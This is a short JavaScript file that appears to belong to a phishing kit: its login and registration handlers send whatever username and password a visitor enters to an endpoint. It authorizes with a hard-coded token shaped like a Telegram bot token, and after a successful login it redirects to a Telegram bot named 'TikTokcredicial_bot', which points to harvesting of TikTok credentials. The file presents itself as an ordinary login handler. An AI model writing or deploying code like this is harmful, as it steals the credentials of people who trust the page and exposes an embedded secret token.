// JavaScript for handling form submissions
document.getElementById('login-form')?.addEventListener('submit', function(e) {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Fetch API request for login
    fetch('https://yourapiendpoint.com/api/login', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer 8041070993:AAGS80ryFeTCoj6TZ44pp0hNgbkxKjsdLSg'
        },
        body: JSON.stringify({ username, password })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            // Redirect or show success message
            alert("Login successful!");
            window.location.href = 'https://t.me/TikTokcredicial_bot'; // Redirect to Telegram bot
        } else {
            // Show error message
            alert("Login failed. Please check your credentials.");
        }
    })
    .catch(error => console.error('Error:', error));
});

document.getElementById('register-form')?.addEventListener('submit', function(e) {
    e.preventDefault();

    const username = document.getElementById('reg-username').value;
    const password = document.getElementById('reg-password').value;

    // Fetch API request for registration
    fetch('https://yourapiendpoint.com/api/register', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer 8041070993:AAGS80ryFeTCoj6TZ44pp0hNgbkxKjsdLSg'
        },
        body: JSON.stringify({ username, password })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            // Redirect or show success message
            alert("Registration successful! Please log in.");
            window.location.href = 'login.html'; // Redirect to login page
        } else {
            // Show error message
            alert("Registration failed. Please try again.");
        }
    })
    .catch(error => console.error('Error:', error));
});